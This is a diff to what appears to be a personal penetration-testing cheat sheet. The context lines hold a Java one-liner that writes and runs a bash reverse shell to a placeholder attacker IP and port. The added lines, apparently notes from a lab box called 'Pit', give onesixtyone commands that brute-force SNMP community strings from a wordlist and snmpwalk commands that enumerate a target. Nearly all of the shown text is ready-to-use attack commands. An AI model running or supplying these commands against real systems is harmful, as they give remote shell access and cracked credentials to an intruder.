@@ -146,3 +146,17 @@ one line reverse shell command in Java
 String[] cmdline = { "sh", "-c", "echo 'bash -i >& /dev/tcp/<attacker ip>/<attacker port> 0>&1' > /tmp/revshell.sh && chmod 777 /tmp/revshell.sh && bash /tmp/revshell.sh" }; 
 Runtime.getRuntime().exec(cmdline);
 ```
+
+Used in ```Pit```
+
+```
+# crack SNMP passwords
+onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt -p <target port> <target ip>
+```
+
+```
+snmpwalk -v1 -c public <target ip> .
+# -v 1|2c|3 SNMP version
+# -c community string, like a password
+# . [OID]
+```
